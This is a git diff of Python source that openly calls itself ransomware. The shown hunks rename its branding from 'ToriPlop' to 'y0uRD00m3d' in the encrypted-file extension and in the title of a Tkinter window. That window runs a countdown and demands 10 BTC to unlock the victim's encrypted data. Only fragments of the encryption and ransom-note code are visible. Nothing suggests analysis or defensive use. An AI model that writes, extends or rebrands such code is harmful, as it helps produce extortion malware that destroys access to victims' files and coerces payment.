@@ -45,7 +45,7 @@ def encrypt(dataFile, publicKey):
 
     # save the encrypted data to file
     fileName = dataFile.split(extension)[0]
-    fileExtension = 'ToriPlop'#y0uRD00m3d
+    fileExtension = '.Y0urd00m3d'#y0uRD00m3d
 
     encryptFile = fileName + fileExtension
     with open(encryptFile, 'wb') as f:
@@ -85,7 +85,7 @@ def countdown(count):
         root.after(1000, countdown, '{}:{}:{}'.format(hour,minute,second))
 
 root = tk.Tk()
-root.title('ToriPlop Ransomware')
+root.title('y0uRD00m3d Ransomware')
 root.geometry('500x300')
 root.resizable(False, False)
 label1 = tk.Label(root, text = 'You data is encrypted, pay me 10 BTCs,\nto unlock them !!!\n\n', font=('calibri', 12, 'bold'))
